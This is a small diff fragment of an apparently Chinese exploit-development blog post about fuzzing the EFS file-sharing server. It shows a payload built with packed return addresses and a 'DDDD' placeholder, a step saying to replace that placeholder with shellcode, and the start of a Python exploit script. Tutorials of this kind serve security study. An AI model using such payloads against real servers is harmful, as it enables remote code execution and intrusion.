@@ -278,6 +278,7 @@ payload += struct.pack("<I", 0x019b68d4) + struct.pack("<I", 0x1001b371) + “DD
 ![img](https://raw.githubusercontent.com/carterMgj/blog_img/master/2017-06-07-fuzz-EFS/23.png)
 
 13. 将payload中"DDDD"的位置换做shellcode就大功告成了
+
 ```python
 import socket
 import struct
